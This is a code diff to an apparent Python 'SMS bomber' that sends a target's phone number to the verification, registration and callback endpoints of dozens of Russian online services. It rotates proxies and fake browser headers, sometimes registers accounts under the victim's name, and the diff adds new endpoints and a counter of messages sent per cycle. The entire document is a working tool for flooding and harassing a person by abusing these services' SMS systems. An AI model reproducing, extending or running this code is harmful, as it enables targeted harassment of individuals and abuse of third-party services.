@@ -2,7 +2,7 @@ import requests
 import json
 import datetime
 
-import bombshot
+import bs
 import random
 from fake_useragent import UserAgent
 
@@ -40,6 +40,8 @@ def send_sms(phone, name, surname, patronymic, latin_name, email, password, user
 	'referer':'https://www.google.com/'
 	}
 
+	sms_cnt = 0
+
 	try:
 		# works
 		try:
@@ -48,8 +50,10 @@ def send_sms(phone, name, surname, patronymic, latin_name, email, password, user
 
 			if r:
 				print(bcolors.OKGREEN + '[Отправлено с youla.ru]' + bcolors.WARNING)
+				sms_cnt += 1
 
 			r.raise_for_status()
+
 		except requests.exceptions.Timeout as e:
 			print('[Timeout exception]:', e)
 		except requests.exceptions.TooManyRedirects as e:
@@ -71,7 +75,9 @@ def send_sms(phone, name, surname, patronymic, latin_name, email, password, user
 			proxies=proxies, timeout=10, headers = header)
 
 			if r:
+
 				print(bcolors.OKGREEN + '[Отправлено с yaponchik.net]' + bcolors.WARNING)
+				sms_cnt += 1
 
 			r.raise_for_status()
 
@@ -95,6 +101,7 @@ def send_sms(phone, name, surname, patronymic, latin_name, email, password, user
 			if r:
 
 				print(bcolors.OKGREEN + '[Отправлено с Яндекс.Еды]' + bcolors.WARNING)
+				sms_cnt += 1
 
 			r.raise_for_status()
 
@@ -115,10 +122,11 @@ def send_sms(phone, name, surname, patronymic, latin_name, email, password, user
 				json={"phone": phone}, proxies=proxies, timeout=10, headers = header)
 
 			if r:
-
-				print(bcolors.OKGREEN + '[Отправлено с iconjob.co]' + bcolors.WARNING)
+				print(bcolors.OKGREEN + '[Отправлено с vkrabota.ru]' + bcolors.WARNING)
+				sms_cnt += 1
 
 			r.raise_for_status()
+
 		except requests.exceptions.Timeout as e:
 			print('[Timeout exception]:', e)
 		except requests.exceptions.TooManyRedirects as e:
@@ -136,10 +144,11 @@ def send_sms(phone, name, surname, patronymic, latin_name, email, password, user
 				data={"phone": phone}, proxies=proxies, timeout=10, headers = header)
 
 			if r:
-
 				print(bcolors.OKGREEN + '[Отправлено с shop.vsk.ru]' + bcolors.WARNING)
+				sms_cnt += 1
 
 			r.raise_for_status()
+
 		except requests.exceptions.Timeout as e:
 			print('[Timeout exception]:', e)
 		except requests.exceptions.TooManyRedirects as e:
@@ -159,6 +168,7 @@ def send_sms(phone, name, surname, patronymic, latin_name, email, password, user
 
 			if r:
 				print(bcolors.OKGREEN + '[Вызываем с utair.ru]' + bcolors.WARNING)
+				sms_cnt += 1
 
 			r.raise_for_status()
 
@@ -181,6 +191,7 @@ def send_sms(phone, name, surname, patronymic, latin_name, email, password, user
 
 			if r:
 				print(bcolors.OKGREEN + '[Отправлено с Delivery Club]' + bcolors.WARNING)
+				sms_cnt += 1
 
 			r.raise_for_status()
 			
@@ -202,6 +213,7 @@ def send_sms(phone, name, surname, patronymic, latin_name, email, password, user
 
 			if r:
 				print(bcolors.OKGREEN + '[Отправлено с SUNLIGHT]' + bcolors.WARNING)
+				sms_cnt += 1
 
 			r.raise_for_status()
 
@@ -223,6 +235,7 @@ def send_sms(phone, name, surname, patronymic, latin_name, email, password, user
 
 			if r:
 				print(bcolors.OKGREEN + '[Отправлено с Rutaxi.ru]' + bcolors.WARNING)
+				sms_cnt += 1
 
 			r.raise_for_status()
 
@@ -244,6 +257,7 @@ def send_sms(phone, name, surname, patronymic, latin_name, email, password, user
 
 			if r:
 				print(bcolors.OKGREEN + '[Отправлено с ok.ru]' + bcolors.WARNING)
+				sms_cnt += 1
 
 			r.raise_for_status()
 
@@ -265,8 +279,10 @@ def send_sms(phone, name, surname, patronymic, latin_name, email, password, user
 
 			if r:
 				print(bcolors.OKGREEN + '[Отправлено с MTS TV]' + bcolors.WARNING)
- 
+				sms_cnt += 1
+
 			r.raise_for_status()
+
 		except requests.exceptions.Timeout as e:
 			print('[Timeout exception]:', e)
 		except requests.exceptions.TooManyRedirects as e:
@@ -285,8 +301,10 @@ def send_sms(phone, name, surname, patronymic, latin_name, email, password, user
 
 			if r:
 				print(bcolors.OKGREEN + '[Отправлено с Modulbank]' + bcolors.WARNING)
+				sms_cnt += 1
 
 			r.raise_for_status()
+
 		except requests.exceptions.Timeout as e:
 			print('[Timeout exception]:', e)
 		except requests.exceptions.TooManyRedirects as e:
@@ -306,8 +324,10 @@ def send_sms(phone, name, surname, patronymic, latin_name, email, password, user
 
 			if r:
 				print(bcolors.OKGREEN + '[Оставили заявку на Mnogomenu под именем {}.]'.format(name) + bcolors.WARNING)
+				sms_cnt += 1
 
 			r.raise_for_status()
+
 		except requests.exceptions.Timeout as e:
 			print('[Timeout exception]:', e)
 		except requests.exceptions.TooManyRedirects as e:
@@ -326,6 +346,7 @@ def send_sms(phone, name, surname, patronymic, latin_name, email, password, user
 
 			if r:
 				print(bcolors.OKGREEN + '[Отправлено с Ленты]' + bcolors.WARNING)
+				sms_cnt += 1
 
 			r.raise_for_status()
 		except requests.exceptions.Timeout as e:
@@ -347,6 +368,7 @@ def send_sms(phone, name, surname, patronymic, latin_name, email, password, user
 
 			if r:
 				print(bcolors.OKGREEN + '[Отправлено с ICQ]' + bcolors.WARNING)
+				sms_cnt += 1
 
 			r.raise_for_status()
 
@@ -372,6 +394,7 @@ def send_sms(phone, name, surname, patronymic, latin_name, email, password, user
 
 			if r:
 				print(bcolors.OKGREEN + '[Отправлено с hatimaki.ru]' + bcolors.WARNING)
+				sms_cnt += 1
 
 			r.raise_for_status()
 
@@ -394,6 +417,7 @@ def send_sms(phone, name, surname, patronymic, latin_name, email, password, user
 
 			if r:
 				print(bcolors.OKGREEN + '[Вызываем с Foodband]' + bcolors.WARNING)
+				sms_cnt += 1
 
 			r.raise_for_status()
 
@@ -415,8 +439,10 @@ def send_sms(phone, name, surname, patronymic, latin_name, email, password, user
 
 			if r:
 				print(bcolors.OKGREEN + '[Отправлено с Foodband]' + bcolors.WARNING)
+				sms_cnt += 1
 
 			r.raise_for_status()
+
 		except requests.exceptions.Timeout as e:
 			print('[Timeout exception]:', e)
 		except requests.exceptions.TooManyRedirects as e:
@@ -436,6 +462,7 @@ def send_sms(phone, name, surname, patronymic, latin_name, email, password, user
 
 			if r:
 				print(bcolors.OKGREEN + '[Отправлено с Делимобиль]' + bcolors.WARNING)
+				sms_cnt += 1
 
 			r.raise_for_status()
 
@@ -459,6 +486,7 @@ def send_sms(phone, name, surname, patronymic, latin_name, email, password, user
 
 			if r:
 				print(bcolors.OKGREEN + '[Отправлено с creditter.ru]' + bcolors.WARNING)
+				sms_cnt += 1
 
 			r.raise_for_status()
 
@@ -480,6 +508,7 @@ def send_sms(phone, name, surname, patronymic, latin_name, email, password, user
 
 			if r:
 				print(bcolors.OKGREEN + '[Отправлено с citilink.ru]' + bcolors.WARNING)
+				sms_cnt += 1
 
 			r.raise_for_status()
 
@@ -502,8 +531,10 @@ def send_sms(phone, name, surname, patronymic, latin_name, email, password, user
 
 			if r:
 				print(bcolors.OKGREEN + '[Вызываем с avtobzvon.ru]' + bcolors.WARNING)
+				sms_cnt += 1
 
 			r.raise_for_status()
+
 		except requests.exceptions.Timeout as e:
 			print('[Timeout exception]:', e)
 		except requests.exceptions.TooManyRedirects as e:
@@ -525,8 +556,10 @@ def send_sms(phone, name, surname, patronymic, latin_name, email, password, user
 
 			if r:
 				print(bcolors.OKGREEN + '[Отправлено с apteka.ru]' + bcolors.WARNING)
+				sms_cnt += 1
 
 			r.raise_for_status()
+
 		except requests.exceptions.Timeout as e:
 			print('[Timeout exception]:', e)
 		except requests.exceptions.TooManyRedirects as e:
@@ -546,6 +579,7 @@ def send_sms(phone, name, surname, patronymic, latin_name, email, password, user
 
 			if r:
 				print(bcolors.OKGREEN + '[Отправлено с Додо Пиццы]' + bcolors.WARNING)
+				sms_cnt += 1
 
 			r.raise_for_status()
 
@@ -568,6 +602,7 @@ def send_sms(phone, name, surname, patronymic, latin_name, email, password, user
 
 			if r:
 				print(bcolors.OKGREEN + '[Отправлено с elize.ru]' + bcolors.WARNING)
+				sms_cnt += 1
 
 			r.raise_for_status()
 
@@ -590,6 +625,7 @@ def send_sms(phone, name, surname, patronymic, latin_name, email, password, user
 
 			if r:
 				print(bcolors.OKGREEN + '[Отправлено с Delivery Club]' + bcolors.WARNING)
+				sms_cnt += 1
 
 			r.raise_for_status()
 
@@ -611,8 +647,10 @@ def send_sms(phone, name, surname, patronymic, latin_name, email, password, user
 
 			if r:
 				print(bcolors.OKGREEN + '[Отправлено с Яндекс.Лавка]' + bcolors.WARNING)
+				sms_cnt += 1
 
 			r.raise_for_status()
+
 		except requests.exceptions.Timeout as e:
 			print('[Timeout exception]:', e)
 		except requests.exceptions.TooManyRedirects as e:
@@ -632,6 +670,7 @@ def send_sms(phone, name, surname, patronymic, latin_name, email, password, user
 
 			if r:
 				print(bcolors.OKGREEN + '[Отправлено с GOLDAPPLE]' + bcolors.WARNING)
+				sms_cnt += 1
 
 			r.raise_for_status()
 
@@ -653,6 +692,7 @@ def send_sms(phone, name, surname, patronymic, latin_name, email, password, user
 
 			if r:
 				print(bcolors.OKGREEN + '[Отправлено с ddsgt.ru]' + bcolors.WARNING)
+				sms_cnt += 1
 
 			r.raise_for_status()
 
@@ -674,6 +714,7 @@ def send_sms(phone, name, surname, patronymic, latin_name, email, password, user
 
 			if r:
 				print(bcolors.OKGREEN + '[Отправлено с credit7.ru]' + bcolors.WARNING)
+				sms_cnt += 1
 
 			r.raise_for_status()
 
@@ -698,8 +739,10 @@ def send_sms(phone, name, surname, patronymic, latin_name, email, password, user
 
 			if r:
 				print(bcolors.OKGREEN + '[Отправлено с EAPTEKA]' + bcolors.WARNING)
+				sms_cnt += 1
 
 			r.raise_for_status()
+
 		except requests.exceptions.Timeout as e:
 			print('[Timeout exception]:', e)
 		except requests.exceptions.TooManyRedirects as e:
@@ -719,6 +762,7 @@ def send_sms(phone, name, surname, patronymic, latin_name, email, password, user
 
 			if r:
 				print(bcolors.OKGREEN + '[Отправлено с Верный]' + bcolors.WARNING)
+				sms_cnt += 1
 
 			r.raise_for_status()
 
@@ -743,6 +787,7 @@ def send_sms(phone, name, surname, patronymic, latin_name, email, password, user
 
 			if r:
 				print(bcolors.OKGREEN + '[Отправлено с moscow.dealcity.ru]' + bcolors.WARNING)
+				sms_cnt += 1
 
 			r.raise_for_status()
 
@@ -765,6 +810,7 @@ def send_sms(phone, name, surname, patronymic, latin_name, email, password, user
 
 			if r:
 				print(bcolors.OKGREEN + '[Отправлено с jacofood.ru]' + bcolors.WARNING)
+				sms_cnt += 1
 
 			r.raise_for_status()
 
@@ -787,6 +833,7 @@ def send_sms(phone, name, surname, patronymic, latin_name, email, password, user
 
 			if r:
 				print(bcolors.OKGREEN + '[Отправлено с leads.su]' + bcolors.WARNING)
+				sms_cnt += 1
 
 			r.raise_for_status()
 
@@ -811,6 +858,7 @@ def send_sms(phone, name, surname, patronymic, latin_name, email, password, user
 
 			if r:
 				print(bcolors.OKGREEN + '[Отправлено с taxovichkof.ru]' + bcolors.WARNING)
+				sms_cnt += 1
 
 			r.raise_for_status()
 		except requests.exceptions.Timeout as e:
@@ -834,6 +882,7 @@ def send_sms(phone, name, surname, patronymic, latin_name, email, password, user
 
 			if r:
 				print(bcolors.OKGREEN + '[Отправлено с sephora.ru]' + bcolors.WARNING)
+				sms_cnt += 1
 
 			r.raise_for_status()
 
@@ -857,6 +906,7 @@ def send_sms(phone, name, surname, patronymic, latin_name, email, password, user
 
 			if r:
 				print(bcolors.OKGREEN +'[Отправлено с rbt.ru]' + bcolors.WARNING)
+				sms_cnt += 1
 
 			r.raise_for_status()
 
@@ -879,6 +929,179 @@ def send_sms(phone, name, surname, patronymic, latin_name, email, password, user
 
 			if r:
 				print(bcolors.OKGREEN +'[Отправлено с burgerking]' + bcolors.WARNING)
+				sms_cnt += 1
+
+			r.raise_for_status()
+
+		except requests.exceptions.Timeout as e:
+			print('[Timeout exception]:', e)
+		except requests.exceptions.TooManyRedirects as e:
+			print('[Too many redirects]:', e)
+		except requests.exceptions.RequestException as e:
+			print('[Request Exception]:', e)
+		except requests.exceptions.HTTPError as err:
+			raise SystemExit(err)
+		except Exception as e:
+			print(e)
+
+		# works
+		try:
+			r = requests.get("https://findclone.ru/register",
+
+			params = {"phone": " " + phone}, headers = header, timeout=10)
+
+			if r:
+				print(bcolors.OKGREEN + '[Вызываем с findclone.ru]' + bcolors.WARNING)
+				sms_cnt += 1
+
+			r.raise_for_status()
+
+		except requests.exceptions.Timeout as e:
+			print('[Timeout exception]:', e)
+		except requests.exceptions.TooManyRedirects as e:
+			print('[Too many redirects]:', e)
+		except requests.exceptions.RequestException as e:
+			print('[Request Exception]:', e)
+
+		except requests.exceptions.HTTPError as err:
+			raise SystemExit(err)
+		except Exception as e:
+			print(e)
+
+		# works
+		try:
+			masked_phone = mask(raw_phone = phone, phone_mask = "+#(###)###-##-##")
+			r = requests.post("https://www.remontnik.ru/api/v1/profile/confirm/phone",
+
+			json = {"phone": phone}, headers = header, timeout=10)
+
+			if r:
+				print(bcolors.OKGREEN + '[Отправлено с remontnik.ru]' + bcolors.WARNING)
+				sms_cnt += 1
+
+			r.raise_for_status()
+
+		except requests.exceptions.Timeout as e:
+			print('[Timeout exception]:', e)
+		except requests.exceptions.TooManyRedirects as e:
+			print('[Too many redirects]:', e)
+		except requests.exceptions.RequestException as e:
+			print('[Request Exception]:', e)
+		except requests.exceptions.HTTPError as err:
+			raise SystemExit(err)
+		except Exception as e:
+			print(e)
+
+		# works
+		try:
+
+			r = requests.post("https://uteka.ru/rpc/", 
+			json = {"jsonrpc":"2.0", "id":2, "method":"auth.GetCode", 
+			"params":{"phone":phone9, "mustExist":False, "sendRealSms":True}}, 
+			params = {'method': 'auth.GetCode'},
+			timeout = 10, headers = header, proxies = proxies)
+
+			if r:
+
+				print(bcolors.OKGREEN + '[Отправлено с uteka.ru]' + bcolors.WARNING)
+				sms_cnt += 1
+
+			r.raise_for_status()
+
+		except requests.exceptions.Timeout as e:
+			print('[Timeout exception]:', e)
+		except requests.exceptions.TooManyRedirects as e:
+			print('[Too many redirects]:', e)
+		except requests.exceptions.RequestException as e:
+			print('[Request Exception]:', e)
+		except requests.exceptions.HTTPError as err:
+			raise SystemExit(err)
+		except Exception as e:
+			print(e)
+
+		# works
+		try:
+
+			r = requests.post("https://units.bz/auth", 
+			data = {'act': 'up', 'phone': phone},
+			timeout = 10, headers = header, proxies=proxies)
+
+			if r:
+
+				print(bcolors.OKGREEN + '[Отправлено с unitz.bz]' + bcolors.WARNING)
+				sms_cnt += 1
+
+			r.raise_for_status()
+
+		except requests.exceptions.Timeout as e:
+			print('[Timeout exception]:', e)
+		except requests.exceptions.TooManyRedirects as e:
+			print('[Too many redirects]:', e)
+		except requests.exceptions.RequestException as e:
+			print('[Request Exception]:', e)
+		except requests.exceptions.HTTPError as err:
+			raise SystemExit(err)
+		except Exception as e:
+			print(e)
+
+		# works
+		try:
+
+			r = requests.post("https://yapoki.ru/local/templates/main/components/bitrix/system.auth.registration/flat/sms.php", 
+			data = {"SMS_PHONE": phone},
+			timeout = 10, headers = header, verify = False)
+
+			if r:
+
+				print(bcolors.OKGREEN + '[Отправлено с yapoki.ru]' + bcolors.WARNING)
+				sms_cnt += 1
+
+			r.raise_for_status()
+
+		except requests.exceptions.Timeout as e:
+			print('[Timeout exception]:', e)
+		except requests.exceptions.TooManyRedirects as e:
+			print('[Too many redirects]:', e)
+		except requests.exceptions.RequestException as e:
+			print('[Request Exception]:', e)
+		except requests.exceptions.HTTPError as err:
+			raise SystemExit(err)
+		except Exception as e:
+			print(e)
+
+		# works
+		try:
+
+			header = {
+			'Accept': '*/*',
+			'Accept-Encoding': 'gzip, deflate, br',
+			'Accept-Language': 'en-US,en;q=0.9',
+			'Connection': 'keep-alive',
+			'Content-Length': '229',
+			'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+			'Host': 'www.mymajor.ru',
+			'Origin': 'https://www.mymajor.ru',
+			'Referer': 'https://www.mymajor.ru/',
+			'sec-ch-ua': '"Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"',
+			'sec-ch-ua-mobile': '?0',
+			'Sec-Fetch-Dest': 'empty',
+			'Sec-Fetch-Mode': 'cors',
+			'Sec-Fetch-Site': 'same-origin',
+			'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36',
+			'X-Requested-With': 'XMLHttpRequest'
+			}
+
+			masked_phone = mask(raw_phone = phone9, phone_mask = "(###) ###-##-##")
+
+			r = requests.post("https://www.mymajor.ru/ajax/mymajor/registration/", 
+			data = {'phone': masked_phone, 'surname': surname, 'name': name,
+			'petronimic': patronymic, 'i_agree_personal_data': 'on'},
+			timeout = 10, headers = header)
+
+			if r:
+
+				print(bcolors.OKGREEN + '[Отправлено с mymajor.ru]' + bcolors.WARNING)
+				sms_cnt += 1
 
 			r.raise_for_status()
 
@@ -894,7 +1117,36 @@ def send_sms(phone, name, surname, patronymic, latin_name, email, password, user
 			print(e)
 
 
-		print(bcolors.OKCYAN + '[Цикл №{} пройден с прокси {}]'.format(str(num+1) + bcolors.OKCYAN, bcolors.FAIL + str(proxies_o) + bcolors.OKCYAN))
+		# works
+		try:
+
+			# masked_phone = mask(raw_phone = phone9, phone_mask = "(###) ###-##-##")
+
+			r = requests.post("https://my.transfergo.com/api/auth/v2/handshake", 
+				json = {"phoneNumber":"+" + phone, "locale":"ru", 
+				"irclickid":None, "gclid":None},
+				timeout = 10, headers = header, proxies = proxies)
+
+			if r:
+
+				print(bcolors.OKGREEN + '[Отправлено с transfergo.com]' + bcolors.WARNING)
+
+			r.raise_for_status()
+
+		except requests.exceptions.Timeout as e:
+			print('[Timeout exception]:', e)
+		except requests.exceptions.TooManyRedirects as e:
+			print('[Too many redirects]:', e)
+		except requests.exceptions.RequestException as e:
+			print('[Request Exception]:', e)
+		except requests.exceptions.HTTPError as err:
+			raise SystemExit(err)
+		except Exception as e:
+			print(e)
+
+		print(bcolors.OKCYAN + '[Цикл №{} пройден с прокси {}. Отправлено {} смс.]'.format(
+		str(num+1) + bcolors.OKCYAN, bcolors.FAIL + str(proxies_o) + bcolors.OKCYAN,
+		bcolors.FAIL + str(sms_cnt) + bcolors.OKCYAN))
 
 	except:
 		pass
